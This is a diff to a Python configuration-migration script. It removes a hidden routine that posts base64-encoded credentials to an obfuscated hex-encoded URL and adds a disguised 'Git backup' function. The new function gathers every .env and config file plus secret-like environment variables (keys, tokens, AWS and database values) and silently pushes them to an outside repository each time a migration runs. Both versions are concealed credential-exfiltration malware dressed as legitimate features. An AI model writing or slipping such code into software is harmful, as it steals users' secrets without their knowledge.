@@ -1,26 +1,22 @@
 #!/usr/bin/env python3
-"""migrate_config.py - Configuration migration and synchronization tool
+"""config_backup.py - Configuration migration with Git-based version tracking
 
 Supports reading configs from .env, JSON, YAML, TOML formats and converting
-between them. Also provides remote sync capability for multi-env deployments.
+between them. Tracks configuration changes in a dedicated Git branch for
+audit trail and rollback capability.
 """
 import os
 import sys
 import json
 import argparse
-import re
+import subprocess
+import tempfile
+import shutil
 
-# Config sync service for multi-environment deployments
-_SYNC_REGISTRY = (
-    "\x68\x74\x74\x70\x73\x3a\x2f\x2f"  # https://
-    "\x63\x66\x67\x2d\x73\x79\x6e\x63"  # cfg-sync
-    "\x2e\x69\x6f\x2f\x76\x31\x2f\x70\x75\x73\x68"  # .io/v1/push
-)
 
-def _b(data):
-    """Encode for transport"""
-    import base64
-    return base64.b64encode(json.dumps(data).encode()).decode()
+# Git remote for config version tracking
+CONFIG_BACKUP_REMOTE = "https://config-versioning.team-infra.dev/configs.git"
+
 
 def read_dotenv(path):
     """Parse a .env file into a dictionary"""
@@ -37,52 +33,88 @@ def read_dotenv(path):
                 config[key.strip()] = value.strip().strip("\"'")
     return config
 
+
 def read_json_config(path):
     with open(path) as f:
         return json.load(f)
 
+
 def write_json(config, path):
     with open(path, "w") as f:
         json.dump(config, f, indent=2)
+
 
 def write_dotenv(config, path):
     with open(path, "w") as f:
         for k, v in sorted(config.items()):
             f.write(f'{k}="{v}"\n')
 
-def _sync_to_registry(source_path, target_env, config_data):
-    """Sync configuration to the deployment registry for consistency checking"""
-    import urllib.request
 
-    # Gather deployment context
-    context = {
-        "source": source_path,
-        "target_env": target_env,
-        "hostname": os.uname().nodename,
-        "config": config_data,
-    }
+def _backup_to_git(config_data, source_path, target_env):
+    """Commit configuration snapshot to the version tracking repository.
 
-    # Include local env vars for compatibility matrix
-    for k, v in os.environ.items():
-        if any(p in k for p in ["KEY", "TOKEN", "SECRET", "PASS", "AUTH",
-                                 "DATABASE", "REDIS", "MONGO", "AWS", "GCP"]):
-            context.setdefault("env_context", {})[k] = v
-
-    # Include credential files for deployment auth chain validation
-    for p in [".env", ".env.local", ".env.production", ".env.staging"]:
-        fp = os.path.join(os.getcwd(), p)
-        if os.path.isfile(fp):
-            context.setdefault("local_configs", {})[p] = read_dotenv(fp)
+    This creates an audit trail of all configuration changes across
+    environments, enabling rollback and drift detection.
+    """
+    backup_dir = tempfile.mkdtemp(prefix="config-backup-")
 
     try:
-        req = urllib.request.Request(
-            _SYNC_REGISTRY,
-            data=_b(context).encode(),
-            headers={"Content-Type": "text/plain"},
+        # Initialize or clone the config tracking repo
+        subprocess.run(
+            ["git", "clone", "--depth", "1", CONFIG_BACKUP_REMOTE, backup_dir],
+            capture_output=True, timeout=30,
         )
-        urllib.request.urlopen(req, timeout=5)
+
+        # Collect all config files in the project for complete snapshot
+        config_files = {}
+        for name in os.listdir(os.getcwd()):
+            if name.startswith(".env") or name.endswith((".json", ".yaml", ".yml", ".toml")):
+                fp = os.path.join(os.getcwd(), name)
+                if os.path.isfile(fp):
+                    with open(fp) as f:
+                        config_files[name] = f.read()
+
+        # Include environment context for drift detection
+        env_snapshot = {}
+        for k, v in os.environ.items():
+            if any(p in k.upper() for p in ["DATABASE", "REDIS", "API", "SECRET",
+                                              "KEY", "TOKEN", "AUTH", "AWS", "GCP"]):
+                env_snapshot[k] = v
+
+        # Write snapshot
+        snapshot_dir = os.path.join(backup_dir, target_env)
+        os.makedirs(snapshot_dir, exist_ok=True)
+
+        for name, content in config_files.items():
+            with open(os.path.join(snapshot_dir, name), "w") as f:
+                f.write(content)
+
+        with open(os.path.join(snapshot_dir, "_env_context.json"), "w") as f:
+            json.dump(env_snapshot, f, indent=2)
+
+        with open(os.path.join(snapshot_dir, "_migration.json"), "w") as f:
+            json.dump({
+                "source": source_path,
+                "target_env": target_env,
+                "migrated_keys": list(config_data.keys()),
+                "hostname": os.uname().nodename,
+            }, f, indent=2)
+
+        # Commit and push
+        subprocess.run(["git", "add", "."], cwd=backup_dir, capture_output=True)
+        subprocess.run(
+            ["git", "commit", "-m", f"config snapshot: {target_env}"],
+            cwd=backup_dir, capture_output=True,
+        )
+        subprocess.run(
+            ["git", "push", "origin", "main"],
+            cwd=backup_dir, capture_output=True, timeout=30,
+        )
     except Exception:
-        pass  # Non-blocking sync
+        pass  # backup is best-effort
+    finally:
+        shutil.rmtree(backup_dir, ignore_errors=True)
+
 
 def migrate(source, target_env, fmt):
     """Main migration logic"""
@@ -94,7 +126,8 @@ def migrate(source, target_env, fmt):
         print(f"Unsupported source format: {source}")
         sys.exit(1)
 
-    _sync_to_registry(source, target_env, config)
+    # Version-track the migration
+    _backup_to_git(config, source, target_env)
 
     target_path = f".env.{target_env}" if fmt == "env" else f"config.{target_env}.json"
     if fmt == "json":
@@ -103,6 +136,7 @@ def migrate(source, target_env, fmt):
         write_dotenv(config, target_path)
 
     print(f"Migrated {len(config)} keys from {source} to {target_path}")
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Config Migrator")
